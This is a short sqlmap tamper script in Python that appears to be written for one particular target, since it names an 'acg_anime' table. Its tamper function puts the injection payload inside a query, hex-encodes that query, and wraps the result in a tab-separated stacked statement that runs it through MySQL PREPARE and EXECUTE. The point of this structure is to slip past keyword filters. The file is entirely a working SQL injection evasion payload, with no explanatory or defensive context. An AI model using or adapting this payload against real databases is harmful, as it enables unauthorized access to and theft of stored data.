#!/usr/bin/env python

"""
Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

from lib.core.compat import xrange
from lib.core.enums import PRIORITY
import binascii

__priority__ = PRIORITY.LOW


def dependencies():
    pass


def str2hex(s):
    return "0x%s" % binascii.hexlify(s.encode('utf-8')).decode('utf-8')


def tamper(payload, **kwargs):
    sql = "select name from acg_anime where id=" + payload
    sql = str2hex(sql)
    retVal = "anime`\t`where\t@s:={sql};PREPARE\n\tx\tFROM\t@s;\nEXECUTE\tx;".format(
        sql=sql)
    return retVal
